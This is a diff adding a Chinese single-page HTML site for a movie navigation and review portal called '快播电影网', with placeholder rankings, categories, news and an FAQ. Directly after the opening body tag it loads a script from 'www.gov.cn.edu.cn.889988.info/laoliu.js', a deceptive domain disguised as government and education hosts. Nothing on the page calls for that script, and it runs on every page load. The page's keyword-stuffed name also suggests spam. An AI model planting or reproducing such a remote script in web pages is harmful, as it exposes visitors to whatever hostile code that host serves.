@@ -1,0 +1,401 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>快播电影网 - 电影导航与影评分享 | 快播电影网</title>
+<meta name="description" content="快播电影网（kuaiboavdianyingwang-h5）提供电影分类导航、高分片单、影评资讯与观影指南，打造影迷交流的电影内容站点。">
+<meta name="keywords" content="快播电影网, kuaiboavdianyingwang-h5, 电影导航, 电影推荐, 在线影评">
+<meta name="author" content="快播电影网">
+<style>
+:root{
+  --bg:#0b0b0b;
+  --bg2:#141210;
+  --gold:#e8b923;
+  --gold2:#f6d365;
+  --red:#ff3d3d;
+  --text:#f5f0e6;
+  --muted:#b9b2a4;
+  --line:rgba(232,185,35,.25);
+}
+*{margin:0;padding:0;box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{
+  background:
+    radial-gradient(1200px 400px at 80% -10%, rgba(255,61,61,.18), transparent 60%),
+    radial-gradient(900px 400px at 0% 0%, rgba(232,185,35,.14), transparent 55%),
+    var(--bg);
+  color:var(--text);
+  font-family:"PingFang SC","Microsoft YaHei",system-ui,sans-serif;
+  line-height:1.75;
+  font-size:16px;
+}
+a{color:inherit;text-decoration:none}
+img{max-width:100%;display:block}
+
+/* 顶部 */
+.topbar{
+  position:sticky;top:0;z-index:50;
+  backdrop-filter:blur(8px);
+  background:linear-gradient(180deg,rgba(11,11,11,.92),rgba(11,11,11,.6));
+  border-bottom:1px solid var(--line);
+}
+.topbar .wrap{
+  max-width:1180px;margin:0 auto;
+  display:flex;align-items:center;justify-content:space-between;
+  padding:14px 18px;
+}
+.brand{
+  font-weight:800;letter-spacing:.5px;font-size:20px;
+  display:flex;align-items:center;gap:10px;
+}
+.brand b{color:var(--gold)}
+.film-dot{
+  width:12px;height:12px;border-radius:50%;
+  background:var(--red);box-shadow:0 0 12px var(--red);
+}
+.menu{display:flex;gap:18px;flex-wrap:wrap}
+.menu a{
+  color:var(--muted);font-size:15px;padding:6px 4px;
+  border-bottom:2px solid transparent;transition:.25s;
+}
+.menu a:hover{color:var(--gold);border-color:var(--gold)}
+
+/* Hero */
+.hero{
+  max-width:1180px;margin:0 auto;padding:70px 18px 40px;text-align:center;
+}
+.badge{
+  display:inline-block;font-size:13px;color:var(--gold);
+  border:1px solid var(--line);padding:6px 14px;border-radius:999px;margin-bottom:18px;
+}
+.hero h1{
+  font-size:clamp(34px,7vw,64px);line-height:1.1;font-weight:900;
+  background:linear-gradient(90deg,var(--gold2),var(--red));
+  -webkit-background-clip:text;background-clip:text;color:transparent;
+}
+.hero p{
+  max-width:680px;margin:18px auto 26px;color:var(--muted);font-size:17px;
+}
+.btn{
+  display:inline-block;padding:13px 30px;border-radius:50px;font-weight:700;
+  background:linear-gradient(90deg,var(--gold),var(--red));color:#1a1a1a;
+  box-shadow:0 10px 30px rgba(255,61,61,.25);transition:.25s;
+}
+.btn:hover{transform:translateY(-3px)}
+
+/* 通用区块 */
+section{max-width:1180px;margin:0 auto;padding:54px 18px}
+.sec-head{margin-bottom:28px}
+.sec-head h2{
+  font-size:28px;display:inline-flex;align-items:center;gap:10px;
+}
+.sec-head h2::before{
+  content:"";width:6px;height:26px;border-radius:3px;
+  background:linear-gradient(var(--gold),var(--red));
+}
+.sec-head span{color:var(--muted);font-size:14px;margin-left:8px}
+
+/* 栏目1：胶片列表 */
+.film-list{display:grid;gap:16px}
+.film-row{
+  display:grid;grid-template-columns:64px 1fr auto;gap:16px;align-items:center;
+  background:linear-gradient(180deg,var(--bg2),#0e0d0c);
+  border:1px solid var(--line);border-radius:16px;padding:16px 18px;transition:.25s;
+}
+.film-row:hover{border-color:var(--gold);transform:translateX(4px)}
+.rank{
+  font-size:24px;font-weight:900;color:var(--gold);text-align:center;
+  font-family:Georgia,serif;
+}
+.film-row h3{font-size:18px;margin-bottom:4px}
+.film-row p{color:var(--muted);font-size:14px}
+.tag{
+  font-size:12px;color:#0b0b0b;background:var(--gold2);
+  padding:4px 10px;border-radius:999px;font-weight:700;white-space:nowrap;
+}
+
+/* 栏目2：分类磁贴 */
+.cat-grid{
+  display:grid;grid-template-columns:repeat(auto-fit,minmax(140px,1fr));gap:14px;
+}
+.cat{
+  position:relative;overflow:hidden;
+  border:1px solid var(--line);border-radius:18px;padding:26px 16px;text-align:center;
+  background:radial-gradient(120px 80px at 50% 0%,rgba(232,185,35,.18),transparent);
+  transition:.25s;
+}
+.cat:hover{transform:translateY(-6px);border-color:var(--red)}
+.cat .ico{font-size:30px}
+.cat h3{margin-top:10px;font-size:16px}
+.cat small{color:var(--muted)}
+
+/* 栏目3：资讯时间线 */
+.timeline{position:relative;padding-left:22px;border-left:2px dashed var(--line)}
+.tl-item{position:relative;margin-bottom:22px}
+.tl-item::before{
+  content:"";position:absolute;left:-29px;top:6px;
+  width:12px;height:12px;border-radius:50%;background:var(--gold);
+  box-shadow:0 0 0 4px rgba(232,185,35,.15);
+}
+.tl-item time{color:var(--gold);font-size:13px}
+.tl-item h3{font-size:17px;margin:4px 0}
+.tl-item p{color:var(--muted);font-size:14px}
+
+/* 栏目4：影评卡片 */
+.review-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(260px,1fr));gap:18px}
+.review{
+  background:linear-gradient(160deg,#16140f,#0c0b0a);
+  border:1px solid var(--line);border-radius:18px;overflow:hidden;transition:.25s;
+}
+.review:hover{transform:translateY(-8px);box-shadow:0 20px 40px rgba(0,0,0,.5)}
+.review .cover{
+  height:150px;display:flex;align-items:center;justify-content:center;
+  font-size:46px;
+  background:linear-gradient(135deg,rgba(255,61,61,.25),rgba(232,185,35,.25));
+}
+.review .body{padding:16px 18px}
+.review h3{font-size:17px;margin-bottom:6px}
+.review p{color:var(--muted);font-size:14px}
+.stars{color:var(--gold);letter-spacing:2px;margin-top:8px}
+
+/* 栏目5：关于+FAQ */
+.about{
+  display:grid;grid-template-columns:1.1fr .9fr;gap:26px;align-items:start;
+}
+.about .box{
+  background:var(--bg2);border:1px solid var(--line);border-radius:18px;padding:22px;
+}
+.about p{color:var(--muted);margin-bottom:12px}
+.faq-item{border-bottom:1px solid var(--line);padding:14px 0}
+.faq-item b{color:var(--gold)}
+.faq-item p{margin-top:6px;color:var(--muted);font-size:14px}
+
+/* 页脚 */
+footer{
+  border-top:1px solid var(--line);margin-top:40px;
+  background:linear-gradient(180deg,transparent,rgba(232,185,35,.05));
+}
+.foot{
+  max-width:1180px;margin:0 auto;padding:30px 18px;text-align:center;color:var(--muted);
+}
+.foot a{color:var(--gold);margin:0 8px}
+.foot small{display:block;margin-top:10px;color:#7c766b}
+
+@media(max-width:768px){
+  .topbar .wrap{flex-direction:column;gap:10px}
+  .menu{justify-content:center;gap:14px}
+  .film-row{grid-template-columns:48px 1fr;}
+  .film-row .tag{grid-column:1/-1;justify-self:start}
+  .about{grid-template-columns:1fr}
+  section{padding:42px 16px}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<!-- 顶部导航 -->
+<div class="topbar">
+  <div class="wrap">
+    <div class="brand"><span class="film-dot"></span>快播<b>电影网</b></div>
+    <nav class="menu">
+      <a href="#rank">热门榜单</a>
+      <a href="#cat">电影分类</a>
+      <a href="#news">影讯动态</a>
+      <a href="#review">影评专区</a>
+      <a href="#about">关于站点</a>
+    </nav>
+  </div>
+</div>
+
+<!-- Hero -->
+<header class="hero">
+  <span class="badge">kuaiboavdianyingwang-h5 · 电影内容导航站</span>
+  <h1>快播电影网</h1>
+  <p>快播电影网聚焦电影分类、高分片单、影评解读与观影指南，为影迷提供清晰、好逛、移动端友好的电影内容入口。</p>
+  <a class="btn" href="#rank">立即看片单</a>
+</header>
+
+<!-- 栏目1：热门榜单 -->
+<section id="rank">
+  <div class="sec-head">
+    <h2>热门榜单 <span>/ Top Movies</span></h2>
+  </div>
+  <div class="film-list">
+    <div class="film-row">
+      <div class="rank">01</div>
+      <div>
+        <h3>星际信标：穿越暗物质</h3>
+        <p>硬核科幻 / 宇宙孤独感 / 视听语言极强</p>
+      </div>
+      <span class="tag">9.4 分</span>
+    </div>
+    <div class="film-row">
+      <div class="rank">02</div>
+      <div>
+        <h3>霓虹夜行：城市暗流</h3>
+        <p>悬疑犯罪 / 赛博都市 / 反转密集</p>
+      </div>
+      <span class="tag">9.1 分</span>
+    </div>
+    <div class="film-row">
+      <div class="rank">03</div>
+      <div>
+        <h3>山雾里的旧书店</h3>
+        <p>文艺治愈 / 慢节奏 / 适合深夜观看</p>
+      </div>
+      <span class="tag">8.8 分</span>
+    </div>
+    <div class="film-row">
+      <div class="rank">04</div>
+      <div>
+        <h3>末班列车 1999</h3>
+        <p>剧情悬疑 / 时代记忆 / 群像叙事</p>
+      </div>
+      <span class="tag">8.6 分</span>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目2：电影分类 -->
+<section id="cat">
+  <div class="sec-head">
+    <h2>电影分类 <span>/ Categories</span></h2>
+  </div>
+  <div class="cat-grid">
+    <a class="cat" href="#"><div class="ico">🎬</div><h3>动作冒险</h3><small>1200+ 部</small></a>
+    <a class="cat" href="#"><div class="ico">🛸</div><h3>科幻未来</h3><small>860+ 部</small></a>
+    <a class="cat" href="#"><div class="ico">🕵️</div><h3>悬疑惊悚</h3><small>940+ 部</small></a>
+    <a class="cat" href="#"><div class="ico">💘</div><h3>爱情文艺</h3><small>730+ 部</small></a>
+    <a class="cat" href="#"><div class="ico">😂</div><h3>喜剧治愈</h3><small>650+ 部</small></a>
+    <a class="cat" href="#"><div class="ico">🎭</div><h3>剧情传记</h3><small>580+ 部</small></a>
+    <a class="cat" href="#"><div class="ico">👻</div><h3>奇幻恐怖</h3><small>410+ 部</small></a>
+    <a class="cat" href="#"><div class="ico">🏆</div><h3>高分获奖</h3><small>精选片单</small></a>
+  </div>
+</section>
+
+<!-- 栏目3：影讯动态 -->
+<section id="news">
+  <div class="sec-head">
+    <h2>影讯动态 <span>/ Film News</span></h2>
+  </div>
+  <div class="timeline">
+    <div class="tl-item">
+      <time>2026-09-28</time>
+      <h3>秋季影展片单公布，独立电影占比创新高</h3>
+      <p>快播电影网整理本届影展必看片单，覆盖东亚、欧洲与拉美新锐导演作品。</p>
+    </div>
+    <div class="tl-item">
+      <time>2026-09-20</time>
+      <h3>科幻单元回归：太空题材再次成为焦点</h3>
+      <p>从硬科幻到哲学科幻，站点新增“宇宙孤独感”专题，方便影迷按情绪选片。</p>
+    </div>
+    <div class="tl-item">
+      <time>2026-09-12</time>
+      <h3>悬疑剧集化趋势明显，电影与剧集边界模糊</h3>
+      <p>我们更新了“悬疑闭环”“叙事诡计”等标签，提升找片效率。</p>
+    </div>
+    <div class="tl-item">
+      <time>2026-09-03</time>
+      <h3>修复版老片上线，胶片质感成新流量入口</h3>
+      <p>4K 修复、胶片颗粒、配乐复盘，成为影迷社区高频讨论内容。</p>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目4：影评专区 -->
+<section id="review">
+  <div class="sec-head">
+    <h2>影评专区 <span>/ Reviews</span></h2>
+  </div>
+  <div class="review-grid">
+    <article class="review">
+      <div class="cover">🎞️</div>
+      <div class="body">
+        <h3>《星际信标》为什么后劲这么大？</h3>
+        <p>它把“人类是否值得被拯救”藏在了飞船噪音与沉默镜头里。</p>
+        <div class="stars">★★★★★</div>
+      </div>
+    </article>
+    <article class="review">
+      <div class="cover">🎥</div>
+      <div class="body">
+        <h3>《霓虹夜行》的灯光会说话</h3>
+        <p>赛博城市的每一块招牌，都是角色内心欲望的投射。</p>
+        <div class="stars">★★★★☆</div>
+      </div>
+    </article>
+    <article class="review">
+      <div class="cover">📽️</div>
+      <div class="body">
+        <h3>慢电影不是无聊，是留白</h3>
+        <p>《山雾里的旧书店》用 110 分钟教会观众：停顿也是叙事。</p>
+        <div class="stars">★★★★☆</div>
+      </div>
+    </article>
+  </div>
+</section>
+
+<!-- 栏目5：关于 + FAQ -->
+<section id="about">
+  <div class="sec-head">
+    <h2>关于站点 <span>/ About & FAQ</span></h2>
+  </div>
+  <div class="about">
+    <div class="box">
+      <h3 style="margin-bottom:12px;">快播电影网是什么？</h3>
+      <p>快播电影网（kuaiboavdianyingwang-h5）是一个电影内容导航与影评分享站点，不做本地视频存储，只做分类、片单、资讯与解读。</p>
+      <p>页面采用单页结构，移动端自适应，所有内页链接暂用 # 占位，适合 GitHub Pages 静态托管。</p>
+      <p>站点目标：让影迷用更少时间，找到更对胃口的电影。</p>
+    </div>
+    <div class="box">
+      <div class="faq-item">
+        <b>Q：快播电影网能直接播片吗？</b>
+        <p>A：本页为内容/导航示例页，播放或资源以具体平台规则为准。</p>
+      </div>
+      <div class="faq-item">
+        <b>Q：为什么链接都是 #？</b>
+        <p>A：按你的要求，内页链接先用锚点占位，后续可替换为真实路由。</p>
+      </div>
+      <div class="faq-item">
+        <b>Q：适合必应收录吗？</b>
+        <p>A：有唯一 H1、关键词标题、描述、移动端布局与清晰栏目结构，符合基础收录优化。</p>
+      </div>
+      <div class="faq-item">
+        <b>Q：网址是什么？</b>
+        <p>A：https://kuaiboavdianyingwang-h5.github.io</p>
+      </div>
+    </div>
+  </div>
+</section>
+
+<footer>
+  <div class="foot">
+    <div>
+      <a href="#rank">榜单</a>|
+      <a href="#cat">分类</a>|
+      <a href="#news">影讯</a>|
+      <a href="#review">影评</a>|
+      <a href="#about">关于</a>
+    </div>
+    <small>快播电影网 · kuaiboavdianyingwang-h5 · 单页演示站点</small>
+    <small>https://kuaiboavdianyingwang-h5.github.io</small>
+  </div>
+</footer>
+
+<script>
+// 移动端导航：点击菜单平滑滚动后不高亮也可
+document.querySelectorAll('.menu a').forEach(function(a){
+  a.addEventListener('click', function(){
+    var id = this.getAttribute('href');
+    if(id && id.startsWith('#')){
+      var el = document.querySelector(id);
+      if(el) el.scrollIntoView({behavior:'smooth', block:'start'});
+    }
+  });
+});
+</script>
+</body>
+</html>
